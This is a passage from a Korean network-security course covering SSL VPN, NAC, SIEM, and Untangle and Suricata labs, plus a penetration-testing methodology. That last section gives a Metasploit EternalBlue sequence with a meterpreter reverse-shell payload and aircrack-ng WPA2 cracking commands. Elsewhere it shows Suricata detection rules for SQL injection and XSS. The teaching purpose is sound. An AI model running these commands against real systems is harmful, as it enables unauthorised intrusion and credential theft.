**Nginx Reverse Proxy 설정**:
```nginx
upstream backend {
    server 192.168.1.101:8080;
    server 192.168.1.102:8080;
    server 192.168.1.103:8080;
}

server {
    listen 80;
    server_name www.example.com;

    location / {
        proxy_pass http://backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # 캐싱
        proxy_cache my_cache;
        proxy_cache_valid 200 1h;
    }
}
```

---

## 🔒 SSL VPN

### 정의

**SSL VPN**: **웹 브라우저**로 VPN 접속 (전용 클라이언트 불필요)

**IPsec VPN vs SSL VPN**:

| 특징 | IPsec VPN | SSL VPN |
|:---:|:---:|:---:|
| **클라이언트** | 전용 소프트웨어 필요 | 웹 브라우저만 |
| **포트** | UDP 500, 4500 | TCP 443 (HTTPS) |
| **방화벽** | 차단될 수 있음 | 거의 차단 안 됨 |
| **접근** | 전체 네트워크 | 특정 애플리케이션 |
| **보안** | 높음 | 높음 |
| **편의성** | 낮음 | 높음 |

---

### SSL VPN 동작

**1. 웹 포털 접속**:
```
사용자: https://vpn.company.com 접속
        ↓
로그인 페이지 (ID/PW 또는 2FA)
```

**2. 인증 후 포털**:
```
[웹 애플리케이션 목록]
- 인트라넷
- 파일 서버
- 내부 시스템
```

**3. 애플리케이션 접속**:
```
클라이언트 ━━ SSL 터널 ━━> [SSL VPN 게이트웨이] ━━> [내부 서버]
```

---

### SSL VPN 유형

#### 1. Clientless (웹 기반)
```
브라우저에서 직접 접속 (플러그인 없음)
예: 웹메일, 인트라넷
```

#### 2. Client-based (경량 클라이언트)
```
Java Applet, ActiveX (레거시)
또는 경량 에이전트 다운로드
예: SSH, RDP 접속
```

#### 3. Full Tunnel
```
전체 네트워크 트래픽을 VPN으로 라우팅
예: IPsec VPN과 유사
```

---

### 주요 SSL VPN 솔루션

- Fortinet FortiGate SSL VPN
- Palo Alto Networks GlobalProtect
- Cisco AnyConnect
- F5 BIG-IP APM
- OpenVPN (오픈소스)

---

## 🚪 NAC (Network Access Control)

### 정의

**NAC**: 네트워크 **접근 제어** 시스템

**목적**:
- 비인가 장비 차단
- 보안 정책 준수 강제
- 위협 장비 격리

---

### NAC 검증 항목

**1. 장비 인증**:
```
MAC 주소 등록 여부
인증서 설치 여부
```

**2. 보안 상태**:
```
백신 설치 여부
백신 업데이트 최신 여부
OS 패치 최신 여부
방화벽 활성화 여부
```

**3. 사용자 인증**:
```
Active Directory 계정
802.1X 인증
```

---

### NAC 동작

**Pre-Admission (사전 검사)**:
```
1. 장비 연결 시도
2. NAC: 보안 상태 검사
3. 통과 시: 네트워크 접근 허용
4. 실패 시: 격리 네트워크로 이동 (패치/업데이트 유도)
```

**Post-Admission (사후 검사)**:
```
연결 후에도 주기적 검사
위반 발견 시 격리
```

---

## 📊 SIEM/ESM

### 정의

**SIEM (Security Information and Event Management)**:
- 보안 로그 **수집, 분석, 상관분석**

**ESM (Enterprise Security Management)**:
- SIEM과 유사 (한국에서 주로 사용하는 용어)

---

### SIEM 기능

**1. 로그 수집**:
```
[방화벽 로그] ━━┓
[IPS 로그] ━━━━━┫━━> [SIEM]
[서버 로그] ━━━━┛
```

**2. 정규화**:
```
각 장비의 로그 형식을 통일된 형식으로 변환
```

**3. 상관분석 (Correlation)**:
```
이벤트1: 방화벽에서 포트 스캔 탐지 (192.168.1.50)
이벤트2: 1분 후 웹 서버 로그인 실패 (192.168.1.50)
이벤트3: 5분 후 DB 접근 시도 (192.168.1.50)
        ↓
결론: 공격 시도 의심! (알림 생성)
```

**4. 대시보드**:
```
실시간 보안 이벤트 현황 시각화
```

---

### 주요 SIEM 솔루션

**상용**:
- Splunk
- IBM QRadar
- LogRhythm
- ArcSight (Micro Focus)

**오픈소스**:
- ELK Stack (Elasticsearch, Logstash, Kibana)
- Wazuh
- OSSEC

---

## ✅ 학습 체크리스트

- [ ] 계층적 방어 개념을 이해한다
- [ ] DMZ의 역할과 구성을 설명할 수 있다
- [ ] 전통적 방화벽과 NGFW의 차이를 알고 있다
- [ ] IDS와 IPS의 차이를 구분할 수 있다
- [ ] In-line과 Mirror 방식의 차이를 이해한다
- [ ] DDoS 공격 유형을 설명할 수 있다
- [ ] WAF의 역할을 이해한다
- [ ] Forward Proxy와 Reverse Proxy를 구분할 수 있다
- [ ] SSL VPN과 IPsec VPN의 차이를 알고 있다
- [ ] NAC의 동작 원리를 이해한다

---

## 📋 핵심 요약

### 방화벽
- **전통적**: Layer 3/4 (IP, Port)
- **NGFW**: Layer 7 (애플리케이션 인식)
- **UTM**: 중소기업용 통합 장비

### IDS/IPS
- **IDS**: 탐지만 (Out-of-band)
- **IPS**: 차단 (In-line)
- **탐지 방법**: 시그니처, 이상 행위

### DDoS 방어
- **Layer 3/4**: SYN Flood, UDP Flood
- **Layer 7**: HTTP Flood, Slowloris
- **방어**: Rate Limiting, CAPTCHA, CDN

### WAF
- 웹 공격 차단 (SQL Injection, XSS)
- Layer 7 전용

### 프록시
- **Forward**: 클라이언트 대신 요청
- **Reverse**: 서버 대신 응답

---

다음 섹션에서는 **종합 요약 및 실습 랩**을 진행합니다.
# Section 7: 종합 요약 및 실습 랩

## 🎯 학습 목표

이번 섹션에서는 다음 내용을 학습합니다:
- 전체 강의 내용 종합 정리
- Untangle 방화벽 설치 및 설정 실습
- Suricata IDS/IPS 구축 실습
- 네트워크 보안 테스트 방법론
- 트러블슈팅 기법
- 추가 학습 경로 안내
- 최종 체크리스트

---

## 📚 전체 강의 종합 요약

### Section 1: TCP 3-Way Handshake & Wireshark

**핵심 개념**:
```
SYN → SYN+ACK → ACK
 ①       ②      ③
```

**Wireshark 필터**:
```
tcp.flags.syn==1                    # SYN 패킷
ip.addr == 192.168.1.100            # 특정 IP
tcp.port == 443                     # HTTPS
```

**보안 고려사항**:
- **SYN Flooding 공격**: SYN Cookie, Rate Limiting
- **TCP Hijacking**: 랜덤 ISN, TLS 암호화

---

### Section 2: 포트 스캐닝과 Nmap

**주요 스캔 기법**:

| 스캔 방법 | 명령어 | 특징 |
|:---:|:---:|:---:|
| **SYN 스캔** | `nmap -sS` | 빠르고 은밀 |
| **TCP Connect** | `nmap -sT` | 권한 불필요 |
| **서비스 탐지** | `nmap -sV` | 버전 확인 |
| **OS 탐지** | `nmap -O` | OS 식별 |
| **전체 스캔** | `nmap -A` | 종합 스캔 |

**실무 예제**:
```bash
# 내부 네트워크 전체 스캔
sudo nmap -sS -p- -A -oA scan_results 192.168.1.0/24

# 특정 서버 취약점 스캔
nmap --script vuln 192.168.1.100
```

---

### Section 3: HTTP 프로토콜

**버전별 진화**:

```
HTTP/1.0 → 연결당 1개 요청 (비효율)
HTTP/1.1 → Keep-Alive (연결 재사용)
HTTP/2  → Multiplexing (병렬 처리)
HTTP/3  → QUIC/UDP (0-RTT)
```

**상태 코드**:
- **2xx**: 성공 (200 OK, 201 Created)
- **3xx**: 리다이렉션 (301, 302, 304)
- **4xx**: 클라이언트 오류 (400, 401, 403, 404)
- **5xx**: 서버 오류 (500, 502, 503)

**메소드**:
- **GET**: 조회 (Idempotent, Safe)
- **POST**: 생성 (Non-Idempotent)
- **PUT**: 전체 수정 (Idempotent)
- **DELETE**: 삭제 (Idempotent)

---

### Section 4: SSL/TLS & 암호화

**TLS 버전 권장**:
- ❌ TLS 1.0, 1.1 (사용 금지)
- ✅ TLS 1.2 (현재 주력)
- ✅✅ TLS 1.3 (권장)

**암호화 알고리즘**:

**대칭키**:
- ✅ AES-128/256-GCM
- ❌ 3DES (폐기)

**비대칭키**:
- ✅ ECDHE (타원 곡선)
- ✅ RSA-2048 이상
- ❌ RSA-1024 (취약)

**해시**:
- ✅ SHA-256 이상
- ❌ SHA-1, MD5 (폐기)

**TLS Handshake**:

**TLS 1.2**: 2 RTT
```
ClientHello → ServerHello, Certificate → KeyExchange → Finished
```

**TLS 1.3**: 1 RTT (0-RTT 재연결)
```
ClientHello + KeyShare → ServerHello, Certificate (암호화) → Finished
```

---

### Section 5: DNS, SSH, 네트워크 서비스

**DNS 계층**:
```
. (Root) → .com (TLD) → example.com (SLD) → www.example.com (Subdomain)
```

**DNS 레코드**:
- **A**: IPv4 주소
- **AAAA**: IPv6 주소
- **CNAME**: 별칭
- **MX**: 메일 서버
- **TXT**: 텍스트 (SPF, DKIM)

**SSH**:
- **포트**: 22
- **인증**: 패스워드 (비권장) / 공개키 (권장)
- **포트 포워딩**:
  - 로컬 (`-L`): 내부 서버 접근
  - 리모트 (`-R`): 외부 공개
  - 다이나믹 (`-D`): SOCKS 프록시

**FTP**:
- **Active**: 서버 → 클라이언트 (방화벽 문제)
- **Passive**: 클라이언트 → 서버 (권장)
- **대안**: SFTP (SSH 기반)

---

### Section 6: 네트워크 보안 시스템

**방화벽**:
- **전통적**: Layer 3/4 (IP, Port)
- **NGFW**: Layer 7 (애플리케이션 인식)
- **UTM**: 중소기업 통합 장비

**IDS/IPS**:
- **IDS**: 탐지만 (Out-of-band)
- **IPS**: 차단 (In-line)

**DDoS 방어**:
- **Layer 3/4**: SYN Flood, UDP Flood
- **Layer 7**: HTTP Flood, Slowloris

**WAF**: 웹 공격 차단 (SQL Injection, XSS)

**프록시**:
- **Forward**: 클라이언트 대신
- **Reverse**: 서버 대신

---

## 🛠️ 실습 Lab 1: Untangle 방화벽 설치 및 설정

### Untangle이란?

**정의**: 오픈소스 기반 **통합 보안 게이트웨이** (UTM)

**기능**:
- 방화벽
- IPS
- 웹 필터링
- 애플리케이션 제어
- VPN
- 트래픽 분석

**라이센스**:
- **Free**: 기본 방화벽, 라우팅
- **유료**: 고급 기능 (IPS, 웹 필터, 앱 제어)

---

### 실습 환경

**요구사항**:
- **하드웨어**: 4GB RAM, 20GB 디스크
- **가상화**: VirtualBox, VMware, Hyper-V
- **네트워크 인터페이스**: 2개 이상
  - WAN (외부)
  - LAN (내부)

**네트워크 구성**:
```
[인터넷] ━━ WAN (eth0) ━━> [Untangle] ━━ LAN (eth1) ━━> [내부 PC]
```

---

### Step 1: Untangle 다운로드 및 설치

**1-1. ISO 다운로드**:
```
https://www.untangle.com/download/
```

**1-2. VirtualBox 가상 머신 생성**:
```
이름: Untangle-FW
타입: Linux
버전: Debian (64-bit)
메모리: 4096 MB
디스크: 20 GB
네트워크 어댑터:
  - 어댑터 1: NAT (WAN)
  - 어댑터 2: 호스트 전용 어댑터 (LAN)
```

**1-3. ISO 마운트 및 부팅**:
```
설정 → 저장소 → 컨트롤러: IDE
→ 광학 드라이브 → ISO 파일 선택
```

**1-4. 설치 진행**:
```
1. 언어 선택: English
2. 디스크 파티션: Guided (전체 디스크 사용)
3. 설치 진행 (약 10분)
4. 재부팅
```

---

### Step 2: 초기 설정

**2-1. 관리 콘솔 접속**:
```
부팅 후 콘솔에 표시된 IP로 접속
예: http://192.168.56.101/setup
```

**2-2. Setup Wizard**:
```
1. 관리자 계정 생성
   Username: admin
   Password: (강력한 비밀번호)

2. 시간대 설정
   Timezone: Asia/Seoul

3. WAN 인터페이스 설정
   Interface: eth0
   Config Type: DHCP (또는 Static)

4. LAN 인터페이스 설정
   Interface: eth1
   IP Address: 192.168.100.1/24
   DHCP Server: Enabled
   DHCP Range: 192.168.100.100 - 192.168.100.200

5. 완료 → Dashboard 이동
```

---

### Step 3: 방화벽 규칙 설정

**3-1. 기본 정책 확인**:
```
Apps → Firewall → Rules
```

**기본 규칙 (Default)**:
```
1. Allow Established (연결 유지)
2. Block Invalid Packets (비정상 패킷 차단)
3. Allow ICMP (Ping)
4. Allow Outbound (내부 → 외부 허용)
```

**3-2. 커스텀 규칙 추가**:

**예제 1: 특정 IP에서 SSH 허용**:
```
Rule:
  Description: Allow SSH from Admin PC
  Conditions:
    - Source Address: 192.168.100.10
    - Destination Port: 22
    - Protocol: TCP
  Action: Pass
```

**예제 2: 내부에서 특정 사이트 차단**:
```
Rule:
  Description: Block Social Media
  Conditions:
    - Destination Address: facebook.com, instagram.com
  Action: Reject
```

---

### Step 4: IPS 활성화 (유료 기능 - 평가판)

**4-1. IPS 앱 설치**:
```
Apps → Rack → Intrusion Prevention
→ Install (평가판 14일)
```

**4-2. IPS 설정**:
```
Apps → Intrusion Prevention → Settings

Detection Engine: Suricata
Rule Updates: Automatic (Daily)

Rules:
  - Emerging Threats (기본 활성화)
  - ETPRO (Pro 버전)
```

**4-3. 경고 확인**:
```
Apps → Intrusion Prevention → Events

실시간 탐지 이벤트 확인:
- 포트 스캔 탐지
- 웹 공격 탐지
- 멀웨어 통신 탐지
```

---

### Step 5: 웹 필터링 설정

**5-1. Web Filter 설치**:
```
Apps → Rack → Web Filter
→ Install
```

**5-2. 카테고리 차단**:
```
Apps → Web Filter → Settings

Blocked Categories:
  ✅ Adult Content
  ✅ Gambling
  ✅ Social Media (업무 시간)
  ✅ Streaming Media
  ✅ Peer-to-Peer
```

**5-3. 특정 사이트 차단/허용**:
```
Blocked Sites:
  youtube.com
  facebook.com

Passed Sites (예외):
  linkedin.com
  github.com
```

---

### Step 6: 트래픽 모니터링

**6-1. Dashboard**:
```
Dashboard → Sessions
실시간 세션 목록:
- Client IP
- Protocol
- Destination
- Bandwidth
```

**6-2. Reports**:
```
Apps → Reports

주요 리포트:
- Bandwidth Usage by Client
- Top Websites
- Top Applications
- Blocked Events
```

---

## 🛡️ 실습 Lab 2: Suricata IDS/IPS 구축

### 실습 환경

**OS**: Ubuntu 22.04 LTS

**네트워크**:
```
[테스트 PC] ━━> [Suricata 서버] ━━> [인터넷]
               (Bridge Mode)
```

---

### Step 1: Suricata 설치

**1-1. PPA 추가**:
```bash
sudo add-apt-repository ppa:oisf/suricata-stable
sudo apt-get update
```

**1-2. Suricata 설치**:
```bash
sudo apt-get install suricata jq
```

**1-3. 버전 확인**:
```bash
suricata --version
# Suricata version 7.0.x
```

---

### Step 2: 네트워크 인터페이스 설정

**2-1. 인터페이스 확인**:
```bash
ip addr
# eth0: WAN
# eth1: LAN
```

**2-2. Suricata 설정 파일 수정**:
```bash
sudo nano /etc/suricata/suricata.yaml
```

**주요 설정**:
```yaml
# 인터페이스 설정
af-packet:
  - interface: eth0
    cluster-id: 99
    cluster-type: cluster_flow
    defrag: yes

  - interface: eth1
    cluster-id: 98
    cluster-type: cluster_flow
    defrag: yes

# 홈 네트워크 정의
HOME_NET: "[192.168.1.0/24]"
EXTERNAL_NET: "!$HOME_NET"

# 로그 설정
outputs:
  - fast:
      enabled: yes
      filename: fast.log

  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types:
        - alert
        - http
        - dns
        - tls
        - files
```

---

### Step 3: 룰셋 다운로드

**3-1. Suricata-Update 실행**:
```bash
sudo suricata-update
```

**출력**:
```
Downloading Emerging Threats Open ruleset...
Downloaded 36000+ rules
```

**3-2. 룰셋 위치 확인**:
```bash
ls -la /var/lib/suricata/rules/
# suricata.rules (통합 룰 파일)
```

---

### Step 4: IDS 모드 실행

**4-1. Suricata 시작**:
```bash
sudo systemctl start suricata
sudo systemctl enable suricata
```

**4-2. 상태 확인**:
```bash
sudo systemctl status suricata
```

**4-3. 로그 실시간 확인**:
```bash
sudo tail -f /var/log/suricata/fast.log
```

---

### Step 5: 탐지 테스트

**5-1. Nmap 스캔 (공격자 역할)**:

**다른 PC에서**:
```bash
nmap -sS -p- 192.168.1.100
```

**5-2. Suricata 알림 확인**:
```bash
sudo tail -f /var/log/suricata/fast.log
```

**예상 출력**:
```
[**] [1:2100498:7] GPL SCAN nmap XMAS [**]
[Classification: Attempted Information Leak] [Priority: 2]
12/02/2024-09:00:00.123456 192.168.1.50:54321 -> 192.168.1.100:80
TCP TTL:64 TOS:0x0 ID:12345 IpLen:20 DgmLen:60 DF
***A**** Seq: 0x0  Ack: 0x0  Win: 0x400  TcpLen: 40
```

**5-3. JSON 로그 확인 (상세)**:
```bash
sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'
```

---

### Step 6: IPS 모드 활성화 (차단)

**6-1. IPS 모드 설정**:

**NFQueue 설치**:
```bash
sudo apt-get install iptables
```

**방화벽 규칙 추가**:
```bash
# 모든 트래픽을 Suricata로 전달
sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
```

**6-2. Suricata IPS 모드 실행**:
```bash
sudo suricata -c /etc/suricata/suricata.yaml -q 0
```

**6-3. 차단 테스트**:

**커스텀 룰 추가** (`/etc/suricata/rules/local.rules`):
```
drop tcp any any -> $HOME_NET 80 (msg:"Block HTTP to Web Server"; sid:1000001; rev:1;)
```

**룰 재로드**:
```bash
sudo suricatasc -c reload-rules
```

**테스트**:
```bash
curl http://192.168.1.100
# 차단됨!
```

---

### Step 7: 룰 커스터마이징

**7-1. SQL Injection 탐지 룰**:
```
alert http any any -> $HOME_NET any (msg:"SQL Injection Attempt"; flow:established,to_server; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; sid:1000002; rev:1;)
```

**7-2. XSS 탐지 룰**:
```
alert http any any -> $HOME_NET any (msg:"XSS Attempt"; flow:established,to_server; content:"<script>"; nocase; sid:1000003; rev:1;)
```

**7-3. 파일 다운로드 차단**:
```
drop http any any -> any any (msg:"Block EXE Download"; flow:established,to_client; fileext:"exe"; sid:1000004; rev:1;)
```

---

### Step 8: 성능 모니터링

**8-1. 통계 확인**:
```bash
sudo suricatasc -c dump-counters | jq
```

**주요 메트릭**:
```json
{
  "capture.kernel_packets": 1234567,
  "decoder.pkts": 1234500,
  "detect.alert": 42,
  "tcp.sessions": 5000,
  "http.requests": 10000
}
```

**8-2. CPU/메모리 사용량**:
```bash
top -p $(pgrep suricata)
```

---

## 🔍 네트워크 보안 테스트 방법론

### 1. 정보 수집 (Reconnaissance)

**목적**: 대상 시스템 정보 파악

**도구 및 명령어**:

**DNS 조회**:
```bash
nslookup target.com
dig target.com ANY
whois target.com
```

**서브도메인 열거**:
```bash
# Sublist3r (도구 설치 필요)
python3 sublist3r.py -d target.com
```

**포트 스캔**:
```bash
nmap -sS -p- -T4 target.com
```

---

### 2. 취약점 스캔 (Vulnerability Scanning)

**Nmap NSE 스크립트**:
```bash
nmap --script vuln target.com
```

**OpenVAS** (오픈소스 취약점 스캐너):
```bash
# Docker로 실행
docker run -d -p 443:443 --name openvas mikesplain/openvas
```

**Nikto** (웹 서버 스캐너):
```bash
nikto -h http://target.com
```

---

### 3. 침투 테스트 (Penetration Testing)

**Metasploit Framework**:
```bash
msfconsole

# 예: EternalBlue 취약점 공격 (테스트 환경)
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit
```

**⚠️ 경고**: 반드시 **허가된 환경**에서만 테스트!

---

### 4. 웹 애플리케이션 테스트

**OWASP ZAP** (Zed Attack Proxy):
```bash
# GUI 실행
zaproxy

# 프록시 설정 (localhost:8080)
# 브라우저로 타겟 사이트 접속 → 자동 스캔
```

**Burp Suite** (상용/무료):
```
프록시 → Intercept → 요청 변조 → SQL Injection 테스트
```

---

### 5. 무선 네트워크 테스트

**Aircrack-ng**:
```bash
# 모니터 모드 활성화
sudo airmon-ng start wlan0

# AP 스캔
sudo airodump-ng wlan0mon

# 핸드셰이크 캡처
sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon

# WPA2 크랙 (사전 공격)
aircrack-ng -w wordlist.txt capture-01.cap
```

**⚠️ 주의**: 자신의 네트워크에서만 테스트!

---

## 🛠️ 트러블슈팅 기법

### 네트워크 연결 문제

**1단계: Ping 테스트**:
```bash
ping 8.8.8.8           # 인터넷 연결 확인
ping 192.168.1.1       # 게이트웨이 확인
ping 192.168.1.100     # 대상 서버 확인
```

**2단계: Traceroute**:
```bash
traceroute google.com
# 또는
tracert google.com (Windows)
```

**3단계: DNS 확인**:
```bash
nslookup google.com
dig google.com
```

---

### 방화벽/IPS 이슈

**로그 확인**:
```bash
# Untangle
tail -f /var/log/uvm/uvm.log

# Suricata
tail -f /var/log/suricata/fast.log

# iptables
sudo iptables -L -n -v
```

**패킷 캡처**:
```bash
sudo tcpdump -i eth0 -w capture.pcap
# Wireshark로 분석
```

---

### 성능 문제

**대역폭 확인**:
```bash
# iperf3 서버
iperf3 -s

# iperf3 클라이언트
iperf3 -c 192.168.1.100
```

**네트워크 통계**:
```bash
netstat -s          # 프로토콜별 통계
ss -s               # 소켓 통계
nload               # 실시간 대역폭
```

---

## 📖 추가 학습 경로

### 인증 자격증

**네트워크**:
- **CCNA** (Cisco Certified Network Associate)
- **CompTIA Network+**

**보안**:
- **CompTIA Security+** (입문)
- **CEH** (Certified Ethical Hacker)
- **CISSP** (고급)
- **OSCP** (Offensive Security Certified Professional)

---

### 추천 리소스

**온라인 강의**:
- Udemy: "네트워크 보안 완전 정복"
- Coursera: "Cybersecurity Specialization"
- YouTube: NetworkChuck, David Bombal

**실습 플랫폼**:
- **TryHackMe**: 초보자 친화적
- **Hack The Box**: 실전 CTF
- **OverTheWire**: 워게임

**도서**:
- "네트워크 해킹과 보안" (백수현)
- "The Web Application Hacker's Handbook"
- "Metasploit: The Penetration Tester's Guide"

---

## ✅ 최종 체크리스트

### TCP/IP 기초
- [ ] OSI 7계층과 TCP/IP 4계층을 설명할 수 있다
- [ ] TCP 3-Way Handshake 과정을 그릴 수 있다
- [ ] Wireshark로 패킷을 캡처하고 분석할 수 있다
- [ ] 포트 번호의 역할을 이해한다

### 포트 스캐닝
- [ ] Nmap 기본 스캔을 실행할 수 있다
- [ ] SYN 스캔과 TCP Connect 스캔의 차이를 안다
- [ ] 서비스 버전 탐지를 수행할 수 있다
- [ ] 포트 스캔 방어 방법을 설명할 수 있다

### HTTP/HTTPS
- [ ] HTTP 요청/응답 구조를 이해한다
- [ ] HTTP 상태 코드를 구분할 수 있다
- [ ] HTTP/1.1, HTTP/2, HTTP/3의 차이를 설명할 수 있다
- [ ] 쿠키와 세션의 차이를 안다

### SSL/TLS
- [ ] TLS Handshake 과정을 설명할 수 있다
- [ ] 대칭키와 비대칭키 암호화를 구분한다
- [ ] 디지털 인증서의 구조를 이해한다
- [ ] Wireshark로 TLS 트래픽을 분석할 수 있다

### DNS & SSH
- [ ] DNS 질의 과정을 설명할 수 있다
- [ ] DNS 레코드 타입을 구분한다
- [ ] SSH 공개키 인증을 설정할 수 있다
- [ ] SSH 포트 포워딩을 사용할 수 있다

### 네트워크 보안
- [ ] 방화벽과 NGFW의 차이를 이해한다
- [ ] IDS와 IPS의 차이를 설명할 수 있다
- [ ] DDoS 공격 유형을 구분한다
- [ ] WAF의 역할을 이해한다

### 실습
- [ ] Untangle 방화벽을 설치하고 설정할 수 있다
- [ ] Suricata IDS/IPS를 구축할 수 있다
- [ ] 네트워크 보안 테스트를 수행할 수 있다
- [ ] 기본적인 트러블슈팅을 할 수 있다

---

## 🎓 마무리

### 강의 전체 요약

**이번 강의에서 학습한 내용**:

1. **프로토콜 기초**: TCP/IP, HTTP, DNS
2. **보안 기술**: SSL/TLS, 암호화, 인증
3. **공격 및 방어**: 포트 스캔, DDoS, IDS/IPS
4. **실무 도구**: Wireshark, Nmap, Suricata, Untangle
5. **실습**: 실제 환경 구축 및 테스트

---

### 다음 단계

**1주차**: 기초 복습
```
- TCP/IP 프로토콜 스택 완벽 이해
- Wireshark 고급 필터링 연습
- Nmap 모든 스캔 옵션 테스트
```

**2주차**: 심화 학습
```
- TLS 1.3 상세 분석
- WAF 룰 작성 연습
- IDS/IPS 커스텀 시그니처 개발
```

**3주차**: 실전 프로젝트
```
- 홈 네트워크 보안 강화
- 개인 서버 구축 및 보안 설정
- 취약점 스캔 및 패치
```

**4주차**: 자격증 준비
```
- CompTIA Security+ 학습
- CEH 모의 시험
```

---

### 실무 적용 가이드

**중소기업 보안 담당자**:
```
1. UTM 도입 (Untangle, Sophos)
2. IDS/IPS 구축 (Suricata)
3. 로그 모니터링 체계 구축 (ELK Stack)
4. 정기 취약점 스캔 (OpenVAS)
5. 백업 및 재해 복구 계획
```

**대기업 보안 엔지니어**:
```
1. NGFW 도입 및 정책 최적화
2. SIEM 구축 및 상관분석
3. 제로 트러스트 아키텍처 설계
4. 보안 자동화 (SOAR)
5. 위협 인텔리전스 활용
```

**개인 학습자**:
```
1. 홈랩 구축 (라즈베리파이, 중고 PC)
2. 가상화 환경 구축 (VirtualBox, VMware)
3. CTF 참여 (TryHackMe, Hack The Box)
4. 오픈소스 기여 (Suricata, Snort)
5. 블로그/유튜브로 지식 공유
```

---

### 마지막 조언

**"보안은 한 번에 완성되지 않습니다"**

- 지속적인 학습
- 실습 중심
- 커뮤니티 참여
- 최신 트렌드 추적

**"작은 것부터 시작하세요"**

- 개인 PC 보안부터
- 홈 네트워크 보안
- 작은 프로젝트
- 점진적 확대

**"실무 경험이 가장 중요합니다"**

- 인턴십, 계약직이라도 도전
- 오픈소스 프로젝트 참여
- 버그바운티 프로그램
- 컨퍼런스 참석

---

## 🎉 수료를 축하합니다!

**여러분은 이제**:
- 네트워크 프로토콜을 이해하고
- 보안 위협을 인식하며
- 방어 기술을 적용할 수 있습니다

**계속 배우고, 실습하고, 성장하세요!**

**질문이나 피드백은 언제든 환영합니다.**

---

**강의 종료**

2025년 12월 2일
네트워크 보안 & 프로토콜 분석 강의

**감사합니다!** 🙏
